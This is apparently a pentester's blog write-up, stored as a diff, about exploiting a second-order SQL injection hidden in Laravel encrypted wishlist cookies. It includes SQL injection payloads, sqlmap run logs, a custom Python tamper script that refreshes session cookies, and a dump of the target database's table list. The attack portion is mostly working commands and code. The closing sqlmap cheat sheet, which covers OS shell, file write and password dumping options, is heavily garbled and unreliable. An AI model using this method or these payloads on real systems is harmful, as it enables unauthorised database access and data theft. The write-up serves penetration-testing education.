+Set-Cookie: XSRF-TOKEN=eyJpdiI6IjlVXC9XSWtobkdHT0tlZDNhKzZtUW5nPT0iLCJ2YWx1ZSI6Ijg3enBCSHorT1pcLzBKVVVsWDJ4akdEV1lwT2N0bUpzdDNwbmphM3VmQndheDRJZDQ3SWJLYzJ6blFQNHppYytPQzVZNGcxWVdQVlVpWm1MVDFNRklXQT09IiwibWFjIjoiZWRmYjAwYjgzYWQ1NWQyMWM1ZWQ2NjRjMThlZmI3NjQ4ODVkNWE0YWEyZTBhYzRkMjRkOWQ2MmQ4OTA0NDg3YyJ9; expires=Tue, 01-Aug-2017 09:31:12 GMT; Max-Age=7200; path=/
+Set-Cookie: session=eyJpdiI6IkpMdzdJSEE3NndnUXI2NXh0enJYNXc9PSIsInZhbHVlIjoiMkNhek8wXC9FUHQ1bzhjbnMrbHpJWXBjTGhhQTFCM3kyQjI4bTFHRHZkKzZNK2NvSGtwQUZJcWxTeEFHREdEOFBiWVwvVFNyZTNEVlNyRTFlRGMrRlZKZz09IiwibWFjIjoiYTA2ZjlmZTVkYWM3MTc4ODE5Y2VmNmFkNTMzYjYyOTNmZjUxOGRkYjhkYzJmYThhYWM4OTNkNzg4MTliZjVkMSJ9; expires=Tue, 01-Aug-2017 09:31:12 GMT; Max-Age=7200; path=/; HttpOnly
+Content-Length: 324
+Connection: close
+Content-Type: text/html; charset=UTF-8
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="1;url=http://targetwebapp/" />
+        <title>Redirecting to http://targetwebapp/</title>
+    </head>
+    <body>
+        Redirecting to <a href="http://targetwebapp/">http://targetwebapp/</a>.
+    </body>
+</html>
+I was adding one product to the wishlist. If this execution completed successfully, application is redirecting me back to home page. But if I browse an another module ( /wishlist/ ) I was able to see that product with detailed information.
+
+This caught my attention. Why am I seeing a new Set-Cookie parameter on HTTP response ? In to precisely answer my question, I try to add several different product ids to wishlist. As a result, I’ve got new Set-Cookie directive for each individual request.
+
+I wasn’t logged in, yet the application is capable of tracking down which product I’ve added.
+I’m getting Set-Cookie directive whenever I repeat above request with different id.
+So the answer was obvious, encrypted client side session..! The Application is storing those id values of the product on my cookie and performs encryption before sending it back to me. I believe my target is a laravel application because XSRF-TOKEN cookie name and cookie encryption are by default for Laravel framework.
+
+It’s important to understand that whatever I submit through /wishlist/add/<id> endpoint, it will be stored in my encrypted cookie. If I browse /whishlist/ path then following steps will be followed by application.
+
+Take cookie.
+Decrypt the cookie.
+Get wishlist array from cookie data.
+Use this array inside of the query.
+Show details of desired products.
+Protip: If you believe that multiple values are used in one sql query. It’s probably used  like WHERE id IN (<values>) . Think like a developer!
+
+Second Phase : Automated Tools Problems
+To be honest, neither Burp nor Netsparker could detect this SQL Injection. . In order to make it more clear for you, here is the generic  workflow of automated tools.
+
+Login to the app or use supplied cookies.
+Send /wishlist/add/9" and 1=1 -- or /wishlist/add/9'or 1=1-- or /wishlist/add/9' OR SLEEP(25)=0 LIMIT 1-- 
+Those payloads are just example. Automated scanners uses more than this payloads.
+Calculate time gap between request and response.
+HTTP response body analysis, etc
+Wait for out-of-band request.
+According to the above flow, the scanner will not see any difference in the HTTP response body. Also there will be NO big time gap between request and response. App just takes input and stores it at somewhere else -encrypted cookie in this case-.
+
+When scanner go through evey single URL, eventually it will start to browse /whislist/ where SQL query executed. But tool already messed up sql sytnax because of multiple sql payload. Thus, it will see only HTTP 500 error and that’s all.
+
+Third Phase: Make SQLMAP “great” Again
+Below are the first five HTTP requests generated by SQLMap. The first two are correlated and will remain the same at all times
+
+~ python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+[11:48:57] [PAYLOAD] KeJH=9030 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[11:48:57] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:48:57] [INFO] testing if the target URL is stable
+[11:48:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:48:58] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[11:48:58] [PAYLOAD] 9(..,)),('"
+[11:48:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:48:58] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[11:48:58] [PAYLOAD] 9'AGZHkY<'">Bubyju
+[11:48:59] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:48:59] [INFO] testing for SQL injection on URI parameter '#1*'
+[11:48:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:48:59] [PAYLOAD] 9) AND 3632=7420 AND (3305=3305
+[11:48:59] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:48:59] [PAYLOAD] 9) AND 3274=3274 AND (6355=6355
+[11:49:00] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:49:00] [PAYLOAD] 9 AND 5896=8011
+[11:49:00] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:49:00] [PAYLOAD] 9 AND 3274=3274
+[11:49:01] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:49:01] [PAYLOAD] 9') AND 9747=4557 AND ('xqFU'='xqFU
+[11:49:01] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:49:01] [PAYLOAD] 9') AND 3274=3274 AND ('JoAB'='JoAB
+[11:49:01] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:49:01] [PAYLOAD] 9' AND 6443=5019 AND 'zuGP'='zuGP
+[11:49:02] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+[11:49:02] [PAYLOAD] 9' AND 3274=3274 AND 'iWaC'='iWaC
+If you look closer to the first 2 payloads, you will see that sqlmap tries to detect WAF, and then encoding forced by the application. After that it tries to find out syntax form of the sql query by sending multiple payloads one by one. The problem is, all of those payloads will be stored on cookie and that means whenever sqlmap reachs to <span class="m_3515056067618164646enlighterEnlighterJS m_3515056067618164646gmail-EnlighterJS"><span class="m_3515056067618164646gmail-">--second-order</span></span> path, it will see HTTP 500 error. Also the first request already messed up with sql syntax. That means sqlmap will see error for the rest of the attack.
+
+So we need to provide a fresh session for every single HTTP request generated by sqlmap. I’ve done that by implementing custom tamper script.
+
+Following HTTP request and response is our way to force application to initiate a new session.
+
+GET / HTTP/1.1
+Host: targetwebapp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+X-Forwarded-For: 127.0.0.1
+True-Client-Ip: 127.0.0.1
+Connection: close
+Upgrade-Insecure-Requests: 1
+---
+HTTP/1.1 200 OK
+Date: Tue, 01 Aug 2017 06:31:36 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IkIyb0o5TjJ1TTMzcVBseE9mOGFYK1E9PSIsInZhbHVlIjoiemR2V2d1b2xvZ1JcL3I5M0VsV2sxUGR0N2tRYkFPK2FwQ2lZc0xFV25iUkhrWVFjK3VscUJSRFNiekdnQ3VJZVVCa0RJQ0czbVNxMVdSSyt4cXkxbWtnPT0iLCJtYWMiOiIyYmE1YTQyZTAzMDYzNTQ3ZDk0OTkxN2FjMDg5YmMzNzVkOGUxODVmZTVhY2M0MGE4YzU1Yzk4MDE2ODlmMzUwIn0%3D; expires=Tue, 01-Aug-2017 08:31:36 GMT; Max-Age=7200; path=/
+Set-Cookie: session=eyJpdiI6InZqcVk1UWtFOStOMXJ6MFJ4b2JRaFE9PSIsInZhbHVlIjoidGJ0VFJ2VXpqY1hnQ2xXYkxNb2k5QWltRDFTRlk2RmJkQ0RIcWdMYVg2NDZlR0RnTXRSWXVWM3JTOWVxajl5R08wb0RydlhKWkZSMGYrNnF3RjBrSEE9PSIsIm1hYyI6IjYwZWRmZGQ1ODEzODJkZDFmNDIzNmE3ZWYzMDc1MTU5MTI3ZWU4MzVhMjdjN2Q0YjE0YmVkZWYzZGJkMjViNDEifQ%3D%3D; expires=Tue, 01-Aug-2017 08:31:36 GMT; Max-Age=7200; path=/; HttpOnly
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 22296
+Can do following steps.
+
+Send request to the home page without suppling any cookie.
+Parse Set-Cookie and get XSRF-TOKEN  and SESSION .
+Update HTTP request generated by sqlmap.
+So every single detection attempt of sqlmap gonna have fresh session. When sqlmap try to reach /wishlist/ after sending payload, response from /wishlist/ will be related to the only previous payload.
+I strongly suggest you yo use https://github.com/h3xstream/http-script-generator . It’s implemented by Philippe Arteau. I’ve met with him at Black Hat Europe 2015 arsenal stand ?. This extension generates scripts to reissue a selected request.
+
+
+
+Here is my sqlmap tamper module. It send HTTP request to the homepage and retrieves new cookie values. As a final step, it updates Cookie value of HTTP request generated by sqlmap.
+
+#!/usr/bin/env python
+"""
+Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
+See the file 'doc/COPYING' for copying permission
+"""
+import requests
+from lib.core.enums import PRIORITY
+from random import sample
+__priority__ = PRIORITY.NORMAL
+def dependencies():
+    pass
+def new_cookie():
+    session = requests.Session()
+    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
+    response = session.get("http://targetwebapp/", headers=headers)
+    XSRF_TOKEN = response.headers['Set-Cookie'].split(';')[0]
+    SESSION = response.headers['Set-Cookie'].split(';')[3].split(',')[1].replace(" ", "")
+    return "Cookie: {0}; {1}".format(XSRF_TOKEN, SESSION)
+def tamper(payload, **kwargs):
+    headers = kwargs.get("headers", {})
+    headers["Cookie"] = new_cookie()
+    return payload
+???
+
+sqlmap git:(master) ✗ python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" --tamper /tmp/durian.py
+...
+Database: XXX
+[12 tables]
++------------------------------------------------------+
+| categories                                           |
+| comments                                             |
+| coupon_user                                          |
+| coupons                                              |
+| migrations                                           |
+| order_product                                        |
+| orders                                               |
+| password_resets                                      |
+| products                                             |
+| subscribers                                          |
+| user_addresses                                       |
+| users                                                |
++------------------------------------------------------+
+Conclusions
+Use automated scanners but don’t trust the result.
+Hire ninjas who have really good experience at manual application pentesting.
+If you are a pentester, tools are something to help you. But in the end, you are the one who is getting job done.
+Approach matters.
+
+
+Parameters that I commonly use
+-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+-r REQUESTFILE      Load HTTP request from a file
+-p TESTPARAMETER    Testable parameter(s)
+-v VERBOSE          Verbosity level: 0-6 (default 1)
+--proxy=PROXY       Use a proxy to connect to the target URL
+--headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
+--technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+--flush-session     Flush session files for current target
+--skip-waf          Skip heuristic detection of WAF/IPS protection
+--skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
+--level=LEVEL       Level of tests to perform (1-5, default 1)
+--risk=RISK         Risk of tests to perform (1-3, default 1)
+
+Opons
+:
+ -
+h/
+-
+hh
+help/advanced help
+--
+version show version number
+-
+v VERBOSE
+verbosity level: 0
+-
+6 (default 1)
+ 
+Target
+: (At least one of these opons has to be provided)
+ 
+--
+data=DATA
+ 
+data string to be sent through POST
+ --
+param
+-
+del=PDEL
+ 
+character used for spling parameter values
+ 
+--
+cookie=COOKIE
+ 
+HTTP Cookie header
+ --
+cookie
+-
+del=CDEL
+ 
+character used for spling cookie values
+ --
+load
+-
+cookies=L..
+ 
+le containing cookies in Netscape/wget format
+ --
+drop
+-
+set
+-
+cookie
+ 
+ignore Set
+-
+Cookie header from response
+ --
+user
+-
+agent=AGENT
+ 
+--
+random
+-
+agent
+ 
+--
+host=HOST
+ --
+referer=REFERER
+--
+headers=HEADERS
+ --
+auth
+-
+type=AUTH..
+ 
+Basic, Digest, NTLM or PKI
+ --
+auth
+-
+cred=AUTH..
+ 
+name:password
+ --
+auth
+-
+private=A..
+ 
+PEM private key le
+ --
+proxy=PROXY
+ --
+proxy
+-
+cred=PRO.. name:password
+ --
+proxy
+-
+le=PRO..
+ 
+list from a le
+--
+ignore
+-
+proxy ignore system sengs
+ --
+tor
+--
+tor
+-
+port=TPORT
+--
+tor
+-
+type=TYPE HTTP (dt), SOCKS4, SOCKS5
+ --
+check
+-
+tor
+ 
+check to see if Tor is used properly
+ --
+delay=DELAY
+ 
+delay in seconds between each HTTP request
+ --
+meout=TIMEOUT
+ 
+seconds to wait before meout (default 30)
+ --
+retries=RETRIES
+ 
+retries when the connecon meouts (default 3)
+ --
+randomize=RPARAM
+ 
+randomly change value for given parameter(s)
+ --
+safe
+-
+url=SAFURL
+ 
+URL address to visit frequently during tesng
+ --
+safe
+-
+freq=SAFREQ 
+ 
+test requests between two visits to a given safe URL
+ --
+skip
+-
+urlencode
+ 
+skip URL encoding of payload data
+ --
+force
+-
+ssl
+ 
+force usage of SSL/HTTPS
+ --
+hpp
+ 
+use HTTP parameter polluon
+ --
+eval=EVALCODE
+ 
+evaluate provided Python code before the request (e.g.
+ 
+"import hashlib;id2=hashlib.md5(id).hexdigest()")
+ 
+ 
+    S   e   c   u   r    i    t   y    B   y    D   e    f   a   u    l    t .   c   o   m
+ 
+-
+u URL
+ 
+target URL
+ -
+d DIRECT
+ 
+direct connecon to the db
+ -
+m FILE
+ 
+targets in a le
+ -
+l LOGFILE
+ 
+parse from Burp/WebScarab
+ 
+-
+r FILE
+ 
+load HTTP request le
+ -
+g GDORK
+ 
+google dork as target
+ -
+c CONFIGFILE load opons from a conguraon INI le
+ 
+Request
+: (specify how to connect to the target URL)
+ 
+ 
+SQLMap v1.0
+ 
+-
+o
+ 
+turn on all opmizaon switches
+ --
+predict
+-
+output
+ 
+predict common queries output
+ --
+keep
+-
+alive
+ 
+use persistent HTTP(s) connecons
+ --
+null
+-
+connecon
+ 
+retrieve page length without actual HTTP response body
+ --
+threads=THREADS
+ 
+max number of concurrent HTTP(s) requests (default 1)
+ 
+-
+p TESTPARAMETER
+testable parameter(s)
+ --
+skip=SKIP skip tesng for given parameter(s)
+ --
+dbms=DBMS force back
+-
+end DBMS to this value
+ --
+dbms
+-
+cred=DBMS.. DBMS authencaon credenals (user:password)
+ --
+os=OS force backend DBMS OS to this value
+ --
+invalid
+-
+bignum use big numbers for invalidang values
+ --
+invalid
+-
+logical/
+--
+invalid
+-
+string
+ 
+use logical/random for invalidang values
+ --
+no
+-
+cast/
+--
+no
+-
+escape
+ 
+turn o payload casng/escaping
+ --
+prex=PREFIX/
+--
+sux=SUFFIX
+ 
+injecon payload prex/sux string
+ --
+tamper=TAMPER
+ 
+use given script(s) for tampering injecon data
+ 
+Opmizaon
+:
+Injecon
+:
+Detecon
+: (
+used to customize/improve the detecon phase
+)
+ --
+level=LEVEL
+ 
+level of tests to perform (1
+-
+5
+, default 1)
+ 
+--
+risk=RISK
+ 
+risk of tests to perform (0
+-
+3, default 1)
+ --
+string=STRING/
+--
+not
+-
+string=NOT..
+ 
+match when query is evaluated to True/False
+ --
+regexp=REGEXP
+ 
+regexp to match when query is evaluated to True
+ --
+code=CODE
+ 
+HTTP code to match when query is evaluated to True
+ --
+text
+-
+only/
+--
+tles
+ 
+compare pag based only on the textual content/ tles
+ 
+Techniques
+: (
+used to tweak tesng of specic SQL injecon)
+ 
+--
+technique=TECH
+ 
+SQL injecon techniques to use (default "
+BEUSTQ 
+")
+ --
+me
+-
+sec=TIMESEC
+ 
+seconds to delay the DBMS response (default 5)
+ --
+union
+-
+cols=UCOLS
+ 
+range of columns to test for UNION query SQL injecon
+ --
+union
+-
+char=UCHAR
+ 
+character to use for bruteforcing number of columns
+ --
+union
+-
+from=UFROM
+ 
+table to use in FROM part of UNION query SQL injecon
+ --
+dns
+-
+domain=DNS..
+ 
+domain name used for DNS exltraon aack
+ --
+union
+-
+from=UFROM
+ 
+table to use in FROM part of UNION query SQL injecon
+ --
+dns
+-
+domain=DNS..
+ 
+domain name used for DNS exltraon aack
+ --
+second
+-
+order=S..
+ 
+resulng page URL searched for second
+-
+order response
+ 
+
+
+
+ 
+ 
+Enumeraon
+: (enumerate the back
+-
+end database, structure and data contained)
+ 
+-
+a,
+--
+all
+retrieve everything
+ -
+b retrieve banner
+ 
+--
+is
+-
+dba
+check if user is DBA
+ 
+--
+current
+-
+user
+/
+--
+current
+-
+db
+/
+--
+hostname
+ 
+retrieve DBMS current user/database/hostname
+ --
+users/
+--
+passwords
+ 
+enumerate DBMS users / users password hashes
+ --
+privileges/
+--
+roles
+ 
+enumerate DBMS users privileges/roles
+ 
+--
+dbs
+/
+--
+tables/
+--
+columns/
+--
+schema
+ 
+enumerate DBMS dbs/tables/columns/schema
+ --
+count retrieve num of entries for table(s)
+ --
+search search column(s), table/db name
+ 
+--
+dump
+-
+all
+dump all DBMS dbs tables entries
+ 
+--
+dump
+dump DBMS db table entries
+ -
+U USER DBMS user to enumerate
+ --
+exclude
+-
+sysdbs exclude system dbs
+ --
+comments retrieve DBMS comments
+ -
+X EXCLUDECOL table column(s) to not enum
+ 
+-
+D DB
+/
+-
+T TBL
+/
+-
+C COL
+ 
+DBMS database to enumerate / tables / columns
+ --
+where=DUMPWHERE
+ 
+use WHERE condion while table dumping
+ --
+start=LIMITSTART/
+--
+stop=LIMITSTOP
+ 
+rst/last query output entry to retrieve
+ --
+rst=FIRSTCHAR/
+--
+last=LASTCHAR
+ 
+rst/last query output word character to retrieve
+ --
+sql
+-
+le=SQLFILE
+ 
+execute SQL statements from given le(s)
+ --
+sql
+-
+shell
+ 
+prompt for an interacve SQL shell
+ --
+sql
+-
+le=FILE
+ 
+execute SQL statements from given le(s)
+ 
+General
+:
+ 
+-
+s SESSIONFILE
+ 
+load session from .sqlite le
+ -
+t TRAFFICFILE
+ 
+log all HTTP trac
+ 
+--
+batch
+ 
+never ask for input
+ --
+eta
+ 
+display for each eta
+ --
+save
+ 
+save opons to a conguraon INI le
+ 
+--
+update
+ 
+update sqlmap
+ 
+--
+charset
+=CHARSET
+ 
+force character encoding used for data retrieval
+ --
+crawl=CRAWLDEPTH
+ 
+crawl the website starng from the target URL
+ --
+csv
+-
+del=CSVDEL
+ 
+deliming character used in CSV output (default ",")
+ --
+dump
+-
+format=DU..
+ 
+format of dumped data (CSV (default), HTML or SQLITE)
+ 
+--
+ush
+-
+session
+ 
+ush session les for current target
+ --
+forms
+ 
+parse and test forms on target URL
+ --
+fresh
+-
+queries
+ 
+ignore query results stored in session le
+ --
+hex
+ 
+use DBMS hex funcon(s) for data retrieval
+ --
+output
+-
+dir=ODIR
+ 
+custom output directory path
+ --
+parse
+-
+errors
+ 
+parse and display DBMS error messages from responses
+ --
+pivot
+-
+column=P..
+ 
+pivot column name
+ --
+scope=SCOPE
+ 
+regexp to lter targets from provided proxy log
+ --
+test
+-
+lter=TE..
+ 
+select tests by payloads and/or tles (e.g. ROW)
+ 
+ 
+SQLMap v1.0
+Fingerprint
+:
+ 
+-
+f,
+--
+ngerprint
+perform an extensive DBMS version ngerprint
+ 
+Brute Force
+:
+ 
+--
+common
+-
+tables/
+--
+common
+-
+columns check common tables/columns
+ 
+User
+-
+dened funcon injecon
+:
+--
+udf 
+-
+inject inject custom funcons
+--
+shared
+-
+lib=SHLIB local path of the shared lib
+ 
+File system access
+:
+--
+le
+-
+read=RFILE
+/
+--
+le
+-
+write=WFILE read/write local le on the DBMS le system
+ --
+le
+-
+dest=DFILE back
+-
+end DBMS absolute lepath to write to
+ 
+Operang system access
+:
+--
+os
+-
+cmd=OSCMD
+ 
+execute an operang system command
+ 
+--
+os
+-
+shell
+ 
+prompt for an interacve operang system shell
+ 
+--
+os
+-
+pwn
+ 
+prompt for an OOB shell, meterpreter or VNC
+ --
+os
+-
+smbrelay
+ 
+one click prompt for an OOB shell, meterpreter or VNC
+ --
+os
+-
+bof 
+ 
+stored procedure buer overow exploitaon
+ --
+priv
+-
+esc
+ 
+database process user privilege escalaon
+ --
+msf 
+-
+path=MSFPATH/
+--
+tmp
+-
+path=TMPPATH
+ 
+local Metasploit/Remote tmp path
+ 
+Miscellaneous
+:
+ 
+--
+reg
+-
+read/
+--
+reg
+-
+add/
+--
+reg
+-
+del
+ 
+read/write/delete a win registry key value
+ --
+reg
+-
+key=REGKEY win registry key
+ --
+reg
+-
+value=REGVAL win reg key value
+ --
+reg
+-
+data=REGDATA win reg key data
+ --
+reg
+-
+type=REGTYPE win reg key value type
+ 
+Windows registry access
+:
+ 
+2/2
+ -
+z MNEMONICS
+ 
+use short mnemonics (e.g. "u,bat,ban,tec=EU")
+ --
+alert=ALERT
+ 
+run host OS command(s) when SQL injecon is found
+ --
+answers=ANSWERS
+ 
+set queson answers (e.g. "quit=N,follow=N")
+ --
+check
+-
+waf/
+--
+idenfy
+-
+waf 
+ 
+WAF/IPS/IDS protecon
+ 
+ 
+--
+cleanup
+ 
+clean up the DBMS from sqlmap specic UDF and tables
+ --
+dependencies
+ 
+check for missing (non
+-
+core) sqlmap dependencies
+ --
+gpage=GOOGLEPAGE
+ 
+Use Google dork results from specied page number
+ --
+mobile
+ 
+imitate smartphone through HTTP User
+-
+Agent header
+ --
+page
+-
+rank
+ 
+display page rank (PR) for Google dork results
+ --
+purge
+-
+output
+ 
+safely remove all content from output directory
+ --
+smart
+ 
+conduct through tests only if posive heurisc(s)
+ --
+disable
+-
+coloring
+ --
+beep if sql injecon is found.
+ 
+--
+wizard
+ 
+wizard interface for beginner users
